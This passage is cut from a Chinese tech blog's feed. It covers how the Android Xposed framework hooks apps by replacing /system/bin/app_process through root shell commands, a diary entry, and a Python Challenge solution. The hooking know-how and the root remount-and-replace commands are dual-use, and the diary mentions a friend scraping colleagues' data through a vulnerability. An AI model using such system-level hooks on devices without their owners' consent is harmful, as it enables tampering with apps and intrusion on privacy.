把Xposed-Disabler-Recovery.zip文件 从asset copy到sdcard中</span></span><br><span class="line">        <span class="keyword">if</span> (AssetUtil.writeAssetToSdcardFile(<span class="string">"Xposed-Disabler-Recovery.zip"</span>, <span class="number">00644</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            messages.add(<span class="string">""</span>);</span><br><span class="line">            messages.add(getString(R.string.file_extract_failed, <span class="string">"Xposed-Disabler-Recovery.zip"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将编译后的app_process二进制文件，从asset文件夹中，copy到/data/data/de.robv.android.xposed.installer/bin/app_process</span></span><br><span class="line">        File appProcessFile = AssetUtil.writeAssetToFile(APP_PROCESS_NAME, <span class="keyword">new</span> File(XposedApp.BASE_DIR + <span class="string">"bin/app_process"</span>), <span class="number">00700</span>);</span><br><span class="line">        <span class="keyword">if</span> (appProcessFile == <span class="keyword">null</span>) &#123;</span><br><span class="line">            showAlert(getString(R.string.file_extract_failed, <span class="string">"app_process"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (installMode == INSTALL_MODE_NORMAL) &#123;</span><br><span class="line">            <span class="comment">// 普通安装模式</span></span><br><span class="line">            <span class="comment">// 重新挂载/system为rw模式</span></span><br><span class="line">            <span class="comment">// Normal installation</span></span><br><span class="line">            messages.add(getString(R.string.file_mounting_writable, <span class="string">"/system"</span>));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"mount -o remount,rw /system"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(getString(R.string.file_mount_writable_failed, <span class="string">"/system"</span>));</span><br><span class="line">                messages.add(getString(R.string.file_trying_to_continue));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 查看原有的app_process文件是否已经备份，如果没有备份，现将原有的app_process文件备份一下</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> File(<span class="string">"/system/bin/app_process.orig"</span>).exists()) &#123;</span><br><span class="line">                messages.add(getString(R.string.file_backup_already_exists, <span class="string">"/system/bin/app_process.orig"</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"cp -a /system/bin/app_process /system/bin/app_process.orig"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                    messages.add(<span class="string">""</span>);</span><br><span class="line">                    messages.add(getString(R.string.file_backup_failed, <span class="string">"/system/bin/app_process"</span>));</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    messages.add(getString(R.string.file_backup_successful, <span class="string">"/system/bin/app_process.orig"</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                mRootUtil.executeWithBusybox(<span class="string">"sync"</span>, messages);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将项目中的自定义app_process文件copy覆盖系统的app_process,修改权限</span></span><br><span class="line">            messages.add(getString(R.string.file_copying, <span class="string">"app_process"</span>));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"cp -a "</span> + appProcessFile.getAbsolutePath() + <span class="string">" /system/bin/app_process"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_copy_failed, <span class="string">"app_process"</span>, <span class="string">"/system/bin"</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"chmod 755 /system/bin/app_process"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_set_perms_failed, <span class="string">"/system/bin/app_process"</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"chown root:shell /system/bin/app_process"</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_set_owner_failed, <span class="string">"/system/bin/app_process"</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (installMode == INSTALL_MODE_RECOVERY_AUTO) &#123;</span><br><span class="line">            <span class="comment">// 自动进入Recovery</span></span><br><span class="line">            <span class="keyword">if</span> (!prepareAutoFlash(messages, <span class="string">"Xposed-Installer-Recovery.zip"</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (installMode == INSTALL_MODE_RECOVERY_MANUAL) &#123;</span><br><span class="line">            <span class="comment">// 手动进入Recovery</span></span><br><span class="line">            <span class="keyword">if</span> (!prepareManualFlash(messages, <span class="string">"Xposed-Installer-Recovery.zip"</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        File blocker = <span class="keyword">new</span> File(XposedApp.BASE_DIR + <span class="string">"conf/disabled"</span>);</span><br><span class="line">        <span class="keyword">if</span> (blocker.exists()) &#123;</span><br><span class="line">            messages.add(getString(R.string.file_removing, blocker.getAbsolutePath()));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">"rm "</span> + blocker.getAbsolutePath(), messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">""</span>);</span><br><span class="line">                messages.add(getString(R.string.file_remove_failed, blocker.getAbsolutePath()));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// copy XposedBridge.jar 到私有目录，XposedBridge.jar是Xposed提供的jar文件，负责在Native层与FrameWork层进行交互</span></span><br><span class="line">        messages.add(getString(R.string.file_copying, <span class="string">"XposedBridge.jar"</span>));</span><br><span class="line">        File jarFile = AssetUtil.writeAssetToFile(<span class="string">"XposedBridge.jar"</span>, <span class="keyword">new</span> File(JAR_PATH_NEWVERSION), <span class="number">00644</span>);</span><br><span class="line">        <span class="keyword">if</span> (jarFile == <span class="keyword">null</span>) &#123;</span><br><span class="line">            messages.add(<span class="string">""</span>);</span><br><span class="line">            messages.add(getString(R.string.file_extract_failed, <span class="string">"XposedBridge.jar"</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">// 将有关文件系统的存储器常驻信息送入物理介质内，在暂停系统之前,比如要重新启动机器,一定要去执行sync命令</span></span><br><span class="line">        mRootUtil.executeWithBusybox(<span class="string">"sync"</span>, messages);</span><br><span class="line"></span><br><span class="line">        showAlert = <span class="keyword">false</span>;</span><br><span class="line">        messages.add(<span class="string">""</span>);</span><br><span class="line">        <span class="keyword">if</span> (installMode == INSTALL_MODE_NORMAL)</span><br><span class="line">            offerReboot(messages);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            offerRebootToRecovery(messages, <span class="string">"Xposed-Installer-Recovery.zip"</span>, installMode);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 删除busybox 工具库</span></span><br><span class="line">        AssetUtil.removeBusybox();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (showAlert)</span><br><span class="line">            showAlert(TextUtils.join(<span class="string">"\n"</span>, messages).trim());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="为什么要替换app_process">为什么要替换app_process</h4><p>在android的源码中的init.rc文件可以看到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">service zygote /system/bin/app_process -Xzygote /system/bin –zygote –start-system-server</span><br><span class="line">socket zygote stream <span class="number">666</span> </span><br><span class="line">onrestart write /sys/android_power/request_state wake</span><br><span class="line">onrestart write /sys/power/state on</span><br><span class="line">onrestart restart media</span><br><span class="line">onrestart restart netd</span><br></pre></td></tr></table></figure>
<p>app_process是andriod app的启动程序，该注入框架通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。与采取传统的Inhook方式<a href="http://www.mulliner.org/android/feed/mulliner_dbi_hitb_kul2013.pdf" target="_blank" rel="external">Dynamic Dalvik Instrumentation</a>相比，Xposed在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义代码。</p>
<h4 id="为什么要控制zygote进程">为什么要控制zygote进程</h4><p>在Android系统中，应用程序进程都是由Zygote进程孵化出来的，而Zygote进程是由Init进程启动的。Zygote进程在启动时会创建一个Dalvik虚拟机实例，每当它孵化一个新的应用程序进程时，都会将这个Dalvik虚拟机实例复制到新的应用程序进程里面去，从而使得每一个应用程序进程都有一个独立的Dalvik虚拟机实例。所以如果选择对Zygote进程Hook，则能够达到针对系统上所有的应用程序进程Hook，即一个全局Hook。这也是Xposed选择替换app_process的原因。如下图所示：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-2.jpg" alt="hook-before-after"></p>
<p>Zygote进程在启动的过程中，除了会创建一个Dalvik虚拟机实例之外，还会将Java运行时库加载到进程中来，以及注册一些Android核心类的JNI方法来前面创建的Dalvik虚拟机实例中去。注意，一个应用程序进程被Zygote进程孵化出来的时候，不仅会获得Zygote进程中的Dalvik虚拟机实例拷贝，还会与Zygote一起共享Java运行时库。这也就是可以将XposedBridge这个jar包加载到每一个Android应用程序中的原因。XposedBridge有一个私有的Native（JNI）方法hookMethodNative，这个方法也在app_process中使用。这个函数提供一个方法对象利用Java的Reflection机制来对内置方法覆写。</p>
<h4 id="Hook/Replace">Hook/Replace</h4><p>Xposed 框架中真正起作用的是对方法的hook。在Repackage技术中，如果要对APK做修改，则需要修改Smali代码中的指令。而另一种动态修改指令的技术需要在程序运行时基于匹配搜索来替换smali代码，但因为方法声明的多样性与复杂性，这种方法也比较复杂。</p>
<p>总结Hook运行过程如下：</p>
<ol>
<li><p>在Android系统启动的时候，zygote进程加载XposedBridge将所有需要替换的Method通过JNI方法hookMethodNative指向Native方法xposedCallHandler，xposedCallHandler在转入handleHookedMethod这个Java方法执行用户规定的Hook Func。</p>
</li>
<li><p>在hookMethodNative的实现中,会调用XposedBridge中的handleHookedMethod这个方法来传递参数;<br>XposedBridge这个jar包含有一个私有的本地方法：hookMethodNative，该方法在附加的app_process程序中也得到了实现。它将一个方法对象作为输入参数（你可以使用Java的反射机制来获取这个方法）并且改变Dalvik虚拟机中对于该方法的定义。它将该方法的类型改变为native并且将这个方法的实现链接到它的本地的通用类的方法。换言之，当调用那个被hook的方法时候，通用的类方法会被调用而不会对调用者有任何的影响。</p>
</li>
<li><p>handleHookedMethod这个方法类似于一个统一调度的Dispatch例程,其对应的底层的C++函数是xposedCallHandler;</p>
</li>
<li><p>handleHookedMethod实现里面会根据一个全局结构hookedMethodCallbacks来选择相应的hook函数,并调用他们的before,after函数;</p>
</li>
<li><p>当多模块同时Hook一个方法的时候，Xposed会自动根据Module的优先级来排序，调用顺序如下：<br>A.before -&gt; B.before -&gt; original method -&gt; B.after -&gt; A.after</p>
</li>
</ol>
<h4 id="Xposed代码分析">Xposed代码分析</h4><p>详见<a href="http://blog.csdn.net/wxyyxc1992/article/details/17320911" target="_blank" rel="external">Android Hook框架Xposed原理与源代码分析</a></p>
<h3 id="Xposed插件编写">Xposed插件编写</h3><p>创建一个插件XposedExample，hook掉系统handleLoadPackage，在系统调用之前打印出加载app的package name，工程用eclipse编写，android studio略有不同。</p>
<p>1.创建一个Blank Activity的android项目</p>
<p>2.工程目录新建lib文件夹，添加文件<a href="http://forum.xda-developers.com/xposed/xposed-api-changelog-developer-news-t2714067" target="_blank" rel="external">XposedBridgeApi-54.jar</a>，然后右键-Build path。</p>
<p>3.修改AndroidManifest.xml，插入xposed元数据。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedmodule"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"true"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposeddescription"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"Xposed Example"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedminversion"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"54"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果不想让插件在系统中显示图标，就把activity给注释掉。</p>
<p>4.完整的的AndroidManifest.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="pi">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">manifest</span> <span class="attribute">xmlns:android</span>=<span class="value">"http://schemas.android.com/apk/res/android"</span></span><br><span class="line">    <span class="attribute">package</span>=<span class="value">"com.idhyt.xposedexample"</span></span><br><span class="line">    <span class="attribute">android:versionCode</span>=<span class="value">"1"</span></span><br><span class="line">    <span class="attribute">android:versionName</span>=<span class="value">"1.0"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">uses-sdk</span></span><br><span class="line">        <span class="attribute">android:minSdkVersion</span>=<span class="value">"8"</span></span><br><span class="line">        <span class="attribute">android:targetSdkVersion</span>=<span class="value">"21"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">application</span></span><br><span class="line">        <span class="attribute">android:allowBackup</span>=<span class="value">"true"</span></span><br><span class="line">        <span class="attribute">android:icon</span>=<span class="value">"@drawable/ic_launcher"</span></span><br><span class="line">        <span class="attribute">android:label</span>=<span class="value">"@string/app_name"</span></span><br><span class="line">        <span class="attribute">android:theme</span>=<span class="value">"@style/AppTheme"</span> &gt;</span></span><br><span class="line">        </span><br><span class="line">         <span class="tag">&lt;<span class="title">activity</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">".XposedExample"</span></span><br><span class="line">            <span class="attribute">android:label</span>=<span class="value">"@string/app_name"</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="title">action</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="title">category</span> <span class="attribute">android:name</span>=<span class="value">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="title">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="title">activity</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedmodule"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"true"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposeddescription"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"Xposed Example"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">meta-data</span></span><br><span class="line">            <span class="attribute">android:name</span>=<span class="value">"xposedminversion"</span></span><br><span class="line">            <span class="attribute">android:value</span>=<span class="value">"54"</span> /&gt;</span> //和XposedBridgeApi-54.jar版本对应</span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="title">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>5.编写插件代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.idhyt.xposedexample;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XposedExample</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        XposedBridge.log(<span class="string">"Loaded app: "</span> + lpparam.packageName);</span><br><span class="line">        XposedBridge.log(<span class="string">"this is a test by idhyt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>6.在assets文件夹(如果不存在就创建)下新建file写入插件启动入口:<br><code>com.idhyt.xposedexample.XposedExample</code></p>
<p>整个工程目录如下所示:<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-3e.jpg" alt="project-dir"></p>
<p>7.运行之后 会在虚拟机中看到我们的插件已经安装到xposed模块里边，然后勾选重启系统。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-4.jpg" alt="install-ok"></p>
<p>8.重启过后，加入过滤规则“loaded app”，在logcat窗口会看到我们的输出日志信息，你打开应用也会显示加载的应用包名。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-5.jpg" alt="logcat-out"></p>
<h3 id="xposed用法详解">xposed用法详解</h3><p>移步：<a href="http://blog.idhyt.com/2015/11/28/4-android-injection-xposed-usage/">安卓注入框架Xposed用法详解</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="概述">概述</h3><p>Xposed是针对Android平台的动态劫持项目，源码<a href="https://github.com/rovo89" target="_blank" rel="external">github</a></p>
<h4 id="]]>
    </summary>
    
      <category term="xposed" scheme="http://blog.idhyt.com/tags/xposed/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[生活碎碎念]]></title>
    <link href="http://blog.idhyt.com/2015/08/22/diary-2015-08-22/"/>
    <id>http://blog.idhyt.com/2015/08/22/diary-2015-08-22/</id>
    <published>2015-08-22T07:06:11.000Z</published>
    <updated>2015-12-31T11:45:54.000Z</updated>
    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;生活好简单呢，还是生活本来就应该这样，由一些简单的事情组成，做任何事情不期望的那么复杂，吃饭睡觉工作，有人一起也是极好的，没人一起也还是按照自己的想法去做就好。最近最上心的一件事情就是学会了游泳，每晚自己会去游一会，刚开始去的时候跟着里边的小朋友学，有天晚上一个热心的大哥告诉我怎么游，然后试了两个晚上就会了，有时候回来的路上会边走边唱歌，然后四周张望下能不能碰到熟人。</p>
<p>&#160; &#160; &#160; &#160;简单的生活习惯了，如果有点复杂的事情，自己可能就会不自觉的去抵制，这么久唯一做的感觉有点后悔的事情就是把一个朋友微信给删了，当时有了被忽视的感觉，其实也是有点太过于在乎了。大学毕业后所有朋友的相处方式都是君子之交淡如水的感觉，玩一起的人都是时间轴上的特定事件，没有刻意去经营一些圈子，是这种感觉，不是什么非你不可，而是有你更好。想到了之前微信群里突然正经的讨论了如何定义坏人，我当时说了，只要这个人对我以及我身边的人没有威胁，那我就认为不算是坏人，至于他对于社会的危害，我想我是不能控制的。其实这就是一个没有结果的命题，就相当于每个人定义朋友的方式不同，一个对别人刻薄和不负责人的人，如果对你还ok，你为什么要去否定它？一个对别人还ok，对你总是刻薄的人，你为何要去肯定它？人和人有不同的交集，可能接触的焦点也不同，就简单的去相信它吧。</p>
<p>&#160; &#160; &#160; &#160;这个渔村不知道有什么特殊的灵气，来这边以后就会经常做梦，而且睡眠还不是很好，总是容易半夜醒，而且有点噪声就会惊醒，之前在家和在学校都是一觉睡到大中午，生活从来没上午的，对于噪声，天空掉下五个字，那都不是事，现在可能慢慢习惯这样了，就不会去特别刻意在意这些反而好了很多，晚上先在床上滚一会找个舒服的姿势，然后就能睡着了，不过还是会做梦，梦太多了，我都忘记梦的是什么了，读研时候我记得有次我好不容易做个梦，然后在梦里不知道碰到什么事情了笑了出来，然后笑声把自己惊醒了，宿舍那三个也是各种惊悚。</p>
<p>&#160; &#160; &#160; &#160;想到了前几天有个高中同学突然QQ上加我，我当时以为有什么事情就问了她，她说好多朋友几年没联系了也找不到了，QQ自动推荐的人中看到了我就加了，我当时也是挺有些感慨的聊了几句。然后过了两天，我的QQ空间里的动态全是她卖面膜，化妆品的广告，还加我微信我果断拒绝了，怎么好好的一个人，说推销就推销呢，这种感情绑架真的很讨人烦。经常会看到朋友发借钱不还又不好意思要，要了就是丢掉一个朋友，我也是深有体会，我穷我有理的感觉。为什么我们不能做好朋友，为什么有的人不经常联系了就是陌生人，有些人不经常联系了一点都不疏远，这些想法都是大脑来做出的决定，大脑也是被认为是最聪明的东西，可是你再仔细想想，做出这个判断的却是大脑自己啊，思想真奇妙。</p>
<p>&#160; &#160; &#160; &#160;昨天耗子在群里发了张照片，是我们快毕业时候去四姑娘山玩的时候合照，被挂在了海螺沟的宾馆，感觉还是有点点意外。想想大家那会多欢乐呢，几个人天天在工作室里边写毕业论文边想着怎么玩，周末就一起出去吃个饭看电影，这样的生活也只能在学校才有能去消费，工作之后感觉能玩的朋友越来越少了，大家都有了自己的圈子，铁打的领导和流水的实习生，感觉一切可以认识到新朋友的机会都像是一件奢侈品。</p>
<p>&#160; &#160; &#160; &#160;一个朋友经常在公司碰到一个妹子，是喜欢的类型但又不好意思去主动认识，他写了个爬虫工具利用某些漏洞把整个公司的人的联系方式和照片全爬了下来，放在硬盘里好久也没有去找这个妹子的联系方式，但下次碰到了还是觉得很想去认识，一直到现在都还没有和她有任何交集，好像自己他没有这些资料一样。人或许都有这样一种心态，对一种不可预知结果的事情总是充满了幻想并充满了期待，一旦知道这件事的结果，好像觉得可有可无了并把自己催眠到一种不可预知的状态。</p>
<p>&#160; &#160; &#160; &#160;这一生有很多再见，是再也不见；这一世有很多相遇，是不期而遇。人生的奇妙，只在无常。于千万人之中，遇见你所要遇见的人；于千万年之中，没有早一步，没有晚一步，刚巧赶上了，那也没有别的话可说，只有相视一笑，享受这美好时光。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160; &#160; &#160; &#160;生活好简单呢，还是生活本来就应该这样，由一些简单的事情组成，做任何事情不期望的那么复杂，吃饭睡觉工作，有人一起也是极好的，没人一起也还是按照自己的想法去做就好。最近最上心的一件事情就是学会了游泳，每晚自己会去游一会，刚开]]>
    </summary>
    
      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[python challenge 21-27]]></title>
    <link href="http://blog.idhyt.com/2015/08/13/python-challenge-21-27/"/>
    <id>http://blog.idhyt.com/2015/08/13/python-challenge-21-27/</id>
    <published>2015-08-13T13:55:11.000Z</published>
    <updated>2015-12-31T12:08:27.000Z</updated>
    <content type="html"><![CDATA[<p>继续斗智斗勇中。已经开始谷歌大法好了。。</p>
<h3 id="python_challenge_21"><a href="">python challenge 21</a></h3><p><code>invader.zip</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Yes! This <span class="keyword">is</span> really level <span class="number">21</span> <span class="keyword">in</span> here. </span><br><span class="line">And yes, After you solve it, yo<span class="string">u'll be in level 22!</span><br><span class="line"></span><br><span class="line">Now for the level:</span><br><span class="line"></span><br><span class="line">* We used to play this game when we were kids</span><br><span class="line">* When I had no idea what to do, I looked backwards.</span></span><br></pre></td></tr></table></figure></p>
<p>说这是个小时候的游戏，击鼓传花，国外的玩法不一样，需要一层层地拆传递的那个东西<br>level 20下载到的那个压缩包的package.pack文件是个压缩文件，使用了zlib和bz2两种方式压缩。<br>需要根据上一次解压得到的结果，判断下一次解压用zlib还是bz2，以及判断得到的数据是正向的还是要look backwards。<br>Zlib压缩的数据开头第一个字节是”\x78”,ASCII码是”x”.<br>BZ压缩的数据开头两个字节是”\x42\x7A”,ASCII码是”BZ”.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">package</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> bz2</span><br><span class="line">    <span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">    data = open(<span class="string">"files/invader/package.pack"</span>, <span class="string">"rb+"</span>).read()</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">"x\x9c"</span>):</span><br><span class="line">            data = zlib.decompress(data)</span><br><span class="line">            result.append(<span class="string">" "</span>)</span><br><span class="line">        <span class="keyword">elif</span> data.startswith(<span class="string">"BZ"</span>):</span><br><span class="line">            data = bz2.decompress(data)</span><br><span class="line">            result.append(<span class="string">"#"</span>)</span><br><span class="line">        <span class="keyword">elif</span> data.endswith(<span class="string">"\x9cx"</span>):</span><br><span class="line">            data = data[::-<span class="number">1</span>]</span><br><span class="line">            result.append(<span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">elif</span> data.endswith(<span class="string">"ZB"</span>):</span><br><span class="line">            data = data[::-<span class="number">1</span>]</span><br><span class="line">            result.append(<span class="string">"*"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">""</span>.join(result)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">      <span class="comment">###          ###      ########    ########    ##########  ########</span></span><br><span class="line">    <span class="comment">#######      #######    #########   #########   #########   #########</span></span><br><span class="line">   <span class="comment">##     ##    ##     ##   ##      ##  ##      ##  ##          ##      ##</span></span><br><span class="line">  <span class="comment">##           ##       ##  ##      ##  ##      ##  ##          ##      ##</span></span><br><span class="line">  <span class="comment">##           ##       ##  #########   #########   ########    #########</span></span><br><span class="line">  <span class="comment">##           ##       ##  ########    ########    ########    ######## </span></span><br><span class="line">  <span class="comment">##           ##       ##  ##          ##          ##          ##   ## 